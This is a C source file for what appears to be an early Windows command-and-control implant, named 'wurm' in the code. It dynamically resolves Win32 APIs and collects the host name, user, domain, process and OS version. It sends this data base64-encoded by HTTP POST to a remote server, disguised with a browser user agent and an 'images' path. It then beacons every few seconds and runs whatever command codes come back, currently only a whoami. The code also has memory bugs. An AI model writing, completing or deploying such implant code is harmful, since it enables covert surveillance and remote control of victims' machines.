#include <stdio.h>
#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>

#define pointer_length 1

typedef BOOL (WINAPI* GETCOMPUTERNAMEA)(
    LPSTR lpBuffer,
    LPDWORD nSize
);

typedef BOOL (WINAPI* GETUSERNAMEA)(
    LPSTR   lpBuffer,
    LPDWORD pcbBuffer
);

typedef DWORD (WINAPI* GETCURRENTPROCESSID)();

typedef DWORD (WINAPI* GETVERSION)();

typedef HINTERNET (WINAPI* INTERNETOPENA)(
    LPCSTR lpszAgent,
    DWORD  dwAccessType,
    LPCSTR lpszProxy,
    LPCSTR lpszProxyBypass,
    DWORD  dwFlags
);

typedef HINTERNET (WINAPI* INTERNETCONNECTA)(
    HINTERNET     hInternet,
    LPCSTR        lpszServerName,
    INTERNET_PORT nServerPort,
    LPCSTR        lpszUserName,
    LPCSTR        lpszPassword,
    DWORD         dwService,
    DWORD         dwFlags,
    DWORD_PTR     dwContext
);

typedef HINTERNET (WINAPI* HTTPOPENREQUESTA)(
    HINTERNET hConnect,
    LPCSTR    lpszVerb,
    LPCSTR    lpszObjectName,
    LPCSTR    lpszVersion,
    LPCSTR    lpszReferrer,
    LPCSTR    *lplpszAcceptTypes,
    DWORD     dwFlags,
    DWORD_PTR dwContext
);

typedef BOOL (WINAPI* HTTPADDREQUESTHEADERSA)(
    HINTERNET hRequest,
    LPCSTR    lpszHeaders,
    DWORD     dwHeadersLength,
    DWORD     dwModifiers
);

typedef BOOL (WINAPI* HTTPSENDREQUESTA)(
    HINTERNET hRequest,
    LPCSTR    lpszHeaders,
    DWORD     dwHeadersLength,
    LPVOID    lpOptional,
    DWORD     dwOptionalLength
);

typedef BOOL (WINAPI* INTERNETQUERYDATAAVAILABLE)(
    HINTERNET hFile,
    LPDWORD   lpdwNumberOfBytesAvailable,
    DWORD     dwFlags,
    DWORD_PTR dwContext
);

typedef BOOL (WINAPI* INTERNETREADFILE)(
    HINTERNET hFile,
    LPVOID    lpBuffer,
    DWORD     dwNumberOfBytesToRead,
    LPDWORD   lpdwNumberOfBytesRead
);

typedef BOOL (WINAPI* INTERNETCLOSEHANDLE)(
    HINTERNET hInternet
);

typedef BOOL (WINAPI* CRYPTBINARYTOSTRINGA)(
    const BYTE *pbBinary,
    DWORD      cbBinary,
    DWORD      dwFlags,
    LPSTR      pszString, 
    DWORD      *pcchString
);

typedef DWORD (WINAPI* GETENVIRONMENTVARIABLEA)(
    LPCTSTR lpName,
    LPTSTR  lpBuffer,
    DWORD   nSize
);

struct {
    struct {
        char            hostname[MAX_PATH];
        char            username[MAX_PATH];
        DWORD           pid;
        char*           name;
        DWORD           version;
        char            arch[MAX_PATH];
        char            domain[MAX_PATH];
        char            product[MAX_PATH];
    } info;
    struct {
        char*           address;
        int             port;
        char*           user_agent;
        char*           path;
        char*           status;
        char*           format;
    } http;
    struct {
        char*           cookie;
        char*           keyword;
    } auth;
    struct {
        DWORD           size;
        char*           buffer;
        char*           length;
    } data;
    struct {
        int             count;
    } beacon;
} wurm;

struct {
    struct {
        struct {
            GETCOMPUTERNAMEA            GetComputerNameA;
            GETUSERNAMEA                GetUserNameA;
            GETCURRENTPROCESSID         GetCurrentProcessId;
            GETVERSION                  GetVersion;
            INTERNETOPENA               InternetOpenA;
            INTERNETCONNECTA            InternetConnectA;
            HTTPOPENREQUESTA            HttpOpenRequestA;
            HTTPADDREQUESTHEADERSA      HttpAddRequestHeadersA;
            HTTPSENDREQUESTA            HttpSendRequestA;
            INTERNETQUERYDATAAVAILABLE  InternetQueryDataAvailable;
            INTERNETREADFILE            InternetReadFile;
            INTERNETCLOSEHANDLE         InternetCloseHandle;
            CRYPTBINARYTOSTRINGA        CryptBinaryToStringA;
            GETENVIRONMENTVARIABLEA     GetEnvironmentVariableA;
        } call;
        struct {
            HMODULE                     kernel32;
            HMODULE                     advapi32;
            HMODULE                     crypt32;
            HMODULE                     wininet;
        } module;
    } win32;
    struct {
        struct {
            /*
            CALLOC                      calloc;
            STRCAT_S                    strcat_s;
            STRLEN                      strlen;
            MALLOC                      malloc;
            SPRINTF                     sprintf;
            FREE                        free;
            MEMSET                      memset;
            REALLOC                     realloc;
            ATOI                        atoi; 
            */
        } call;
        struct {
            HMODULE                     msvcrt;
        } module;
    } other;
} internal;

unsigned char patch_list_name[pointer_length] = {0xAA};

BOOL AA$whoami(CHAR **output) {
    DWORD username_buffer = 256;
    CHAR username[256];
    if (internal.win32.call.GetUserNameA(username, &username_buffer)) {
        *output = (CHAR*)calloc(strlen(username) + 1, sizeof(CHAR));
        strcat_s(*output, strlen(username) + 1, username);
        return TRUE;
    }
    return FALSE;
}

BOOL (*patch_list_pointers[pointer_length]) (CHAR **output) = {AA$whoami};

char* get_endpoint() {
    char path_list[5][11] = {"index", "images", "download", "news", "about"};
    int random_number = rand() % 5;
    char* random_path = path_list[random_number];
    printf("Path: %s\n", random_path);
    wurm.http.path = random_path;
}

void Register() {
    DWORD hostname_length = 256;
    DWORD username_buffer = 256;
    DWORD arch_length = 256;
    DWORD domain_length = 256;
    DWORD version_length = 256;
    PROCESSENTRY32 process_info;
    process_info.dwSize = sizeof(PROCESSENTRY32);

    wurm.http.status = "register";
    wurm.http.format = "%s:%s,%s,%d,%d,%s,%s,%s,%s,%s";

    if (internal.win32.call.GetComputerNameA(wurm.info.hostname, &hostname_length)) {
        printf("Hostname: %s\n", wurm.info.hostname);
    }

    if (internal.win32.call.GetUserNameA(wurm.info.username, &username_buffer)) {
        printf("Username: %s\n", wurm.info.username);
    }

    if (wurm.info.pid = internal.win32.call.GetCurrentProcessId()) {
        printf("Process ID: %lu\n", wurm.info.pid);
    }

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &process_info)) {
        while (Process32Next(snapshot, &process_info)) {
            if (wurm.info.pid == process_info.th32ProcessID) {
                wurm.info.name = process_info.szExeFile;
                printf("Process Name: %s\n", wurm.info.name);
            }
        }
    }

    if (internal.win32.call.GetEnvironmentVariableA("USERDOMAIN", wurm.info.domain, &domain_length)) {
        printf("Domain: %s\n", wurm.info.domain);
    }

    if (internal.win32.call.GetEnvironmentVariableA("PROCESSOR_ARCHITECTURE", wurm.info.arch, &arch_length)) {
        printf("Operating System Arch: %s\n", wurm.info.arch);
    }

    if (RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "ProductName", RRF_RT_REG_SZ, NULL, wurm.info.product, &version_length)) {
        printf("Main Version: %s\n", wurm.info.product);
    }
    
    if (wurm.info.version = internal.win32.call.GetVersion()) {
        printf("Build Version: %lu\n", wurm.info.version);
    }

    CHAR *data_to_encode = malloc(strlen(wurm.http.format) + strlen(wurm.http.status) + strlen(wurm.info.username) + strlen(wurm.info.hostname) + strlen(wurm.info.name) + strlen(wurm.info.domain) + strlen(wurm.info.arch) + strlen(wurm.info.product) + strlen(wurm.auth.keyword));
    sprintf(data_to_encode, wurm.http.format, wurm.http.status, wurm.info.username, wurm.info.hostname, wurm.info.pid, wurm.info.version, wurm.info.name, wurm.info.domain, wurm.info.arch, wurm.info.product, wurm.auth.keyword);

    Encode(data_to_encode);
    Request();
}

void Beacon() {
    wurm.http.format = "%s:%s";
    wurm.http.status = "beacon";
    
    CHAR *data_to_encode = malloc(strlen(wurm.http.format)+ strlen(wurm.auth.cookie) + strlen(wurm.http.status));
    sprintf(data_to_encode, wurm.http.format, wurm.auth.cookie, wurm.http.status);

    Encode(data_to_encode);
    Request();
}

void Encode(char* data_to_encode) {
    CHAR *data_encode = (CHAR*)malloc(strlen(data_to_encode) * 2);
    DWORD data_encode_len = strlen(data_to_encode) * 2;
    CryptBinaryToStringA(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, data_encode, &data_encode_len);

    free(data_to_encode);

    DWORD post_buffer_length = strlen(data_encode) + 5;
    CHAR *post_buffer = (CHAR*)calloc(strlen(data_encode) + 5, sizeof(CHAR));
    sprintf_s(post_buffer, post_buffer_length, "%s\r\n\r\n", data_encode);

    free(data_encode);

    CHAR content_length[MAX_PATH];
    sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);

    wurm.data.size = post_buffer_length;
    wurm.data.buffer = post_buffer;
    wurm.data.length = content_length;
}

BOOL Request() {
    printf("Sending beacon...\n");
    wurm.beacon.count += 1;
    
    HINTERNET hInternet = internal.win32.call.InternetOpenA(wurm.http.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet != NULL) {
        HINTERNET hConnect = internal.win32.call.InternetConnectA(hInternet, wurm.http.address, wurm.http.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect != NULL) {
            HINTERNET hRequest = internal.win32.call.HttpOpenRequestA(hConnect, "POST", wurm.http.path, 0, 0, 0, 0, 0);
            if (hRequest != NULL) {
                internal.win32.call.HttpAddRequestHeadersA(hRequest, wurm.data.length, -1, HTTP_ADDREQ_FLAG_ADD);
                internal.win32.call.HttpSendRequestA(hRequest, 0, 0, wurm.data.buffer, wurm.data.size);

                if (wurm.http.status == "output") {
                    return TRUE;
                }

                CHAR *temp_buffer = NULL;
                DWORD buffer_length = 0;

                while (TRUE) {
                    DWORD available_size = 0;
                    DWORD download_buffer;
                    BOOL available = internal.win32.call.InternetQueryDataAvailable(hRequest, &available_size, 0, 0);
                    if (!available || available_size == 0) {
                        break;
                    }
                    temp_buffer = (CHAR*)realloc(temp_buffer, available_size + 1);
                    memset(temp_buffer, 0, available_size + 1);

                    BOOL value = internal.win32.call.InternetReadFile(hRequest, temp_buffer, available_size, &download_buffer);
                    if (!value || download_buffer == 0) {
                        break;
                    }
                    buffer_length += download_buffer;
                    char* cookie = (CHAR*)realloc(cookie, buffer_length + 1);
                    sprintf_s(cookie, buffer_length + 1, "%s\0", temp_buffer);

                    if (wurm.beacon.count == 1) {
                        wurm.auth.cookie = cookie;
                        printf("Response:%s\n", wurm.auth.cookie);
                    } else {
                        printf("Response:%s\n", cookie);
                        Process(cookie);
                    }
                }

                free(temp_buffer);
                temp_buffer = NULL;

                if (hRequest) {
                    internal.win32.call.InternetCloseHandle(hRequest);
                }
                if (hConnect) {
                    internal.win32.call.InternetCloseHandle(hConnect);
                }
                if (hInternet) {
                    internal.win32.call.InternetCloseHandle(hInternet);
                }
            }
        }
    }
    free(wurm.data.buffer);
    return TRUE;
}

BOOL Process(char* cookie) {
    char* allocated_output = (CHAR*)calloc(10, sizeof(CHAR));
    char* output = NULL;

    int hex_command = atoi(cookie);

    printf("Command: 0x%x\n", hex_command);

    for (int i = 0; i < pointer_length; i++) {
        if (hex_command == patch_list_name[i]) {
            printf("Executing Command\n");
            if ((*patch_list_pointers)(&output)) {
                printf("Output:%s", output);

                int output_length = strlen(allocated_output) + strlen(output) + 1;
                allocated_output = (CHAR*)realloc(allocated_output, output_length);
                strcat_s(allocated_output, output_length, output);
            }
        }
    }
    free(output);

    if (strlen(allocated_output) > 0) {
        wurm.http.format = "%s:%s";
        wurm.http.status = "output";

        CHAR *data_to_encode = malloc(strlen(wurm.http.format) + strlen(wurm.http.status) + strlen(allocated_output));
        sprintf(data_to_encode, wurm.http.format, wurm.http.status, allocated_output);

        Encode(data_to_encode);

        Request();
    }

    free(allocated_output);

}

int main(int argc, char* argv[]) {
    if (argc == 2) {
        wurm.http.address = argv[1];
        wurm.http.port = 8080;
    } else if (argc == 3){
        wurm.http.address = argv[1];
        wurm.http.port = atoi(argv[2]);
    } else {
        wurm.http.address = "127.0.0.1";
        wurm.http.port = 8080;
    }
    printf("Address: %s\n", wurm.http.address);
    printf("Port:%d\n", wurm.http.port);
    // get_endpoint();
    wurm.http.path = "images";
    printf("Path: %s\n", wurm.http.path);

    wurm.http.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
    wurm.http.path = "images";

    wurm.auth.cookie = NULL; 
    wurm.auth.keyword = "boondoggle";

    internal.win32.module.kernel32 = LoadLibraryA("kernel32.dll");
    internal.win32.module.advapi32 = LoadLibraryA("advapi32.dll");
    internal.win32.module.wininet = LoadLibraryA("wininet.dll");
    internal.win32.module.crypt32 = LoadLibraryA("crypt32.dll");

    internal.win32.call.GetUserNameA =                  (GETUSERNAMEA)                  GetProcAddress(internal.win32.module.advapi32, "GetUserNameA");
    internal.win32.call.GetEnvironmentVariableA =       (GETENVIRONMENTVARIABLEA)       GetProcAddress(internal.win32.module.kernel32, "GetEnvironmentVariableA");
    internal.win32.call.GetComputerNameA =              (GETCOMPUTERNAMEA)              GetProcAddress(internal.win32.module.kernel32, "GetComputerNameA");
    internal.win32.call.GetCurrentProcessId =           (GETCURRENTPROCESSID)           GetProcAddress(internal.win32.module.kernel32, "GetCurrentProcessId");
    internal.win32.call.GetVersion =                    (GETVERSION)                    GetProcAddress(internal.win32.module.kernel32, "GetVersion");
    internal.win32.call.InternetOpenA =                 (INTERNETOPENA)                 GetProcAddress(internal.win32.module.wininet, "InternetOpenA");
    internal.win32.call.InternetConnectA =              (INTERNETCONNECTA)              GetProcAddress(internal.win32.module.wininet, "InternetConnectA");
    internal.win32.call.HttpOpenRequestA =              (HTTPOPENREQUESTA)              GetProcAddress(internal.win32.module.wininet, "HttpOpenRequestA");
    internal.win32.call.HttpAddRequestHeadersA =        (HTTPADDREQUESTHEADERSA)        GetProcAddress(internal.win32.module.wininet, "HttpAddRequestHeadersA");
    internal.win32.call.HttpSendRequestA =              (HTTPSENDREQUESTA)              GetProcAddress(internal.win32.module.wininet, "HttpSendRequestA");
    internal.win32.call.InternetQueryDataAvailable =    (INTERNETQUERYDATAAVAILABLE)    GetProcAddress(internal.win32.module.wininet, "InternetQueryDataAvailable");
    internal.win32.call.InternetReadFile =              (INTERNETREADFILE)              GetProcAddress(internal.win32.module.wininet, "InternetReadFile");
    internal.win32.call.InternetCloseHandle =           (INTERNETCLOSEHANDLE)           GetProcAddress(internal.win32.module.wininet, "InternetCloseHandle");

    Register();

    while (TRUE) {
        Beacon();
        Sleep(5000);
    }

}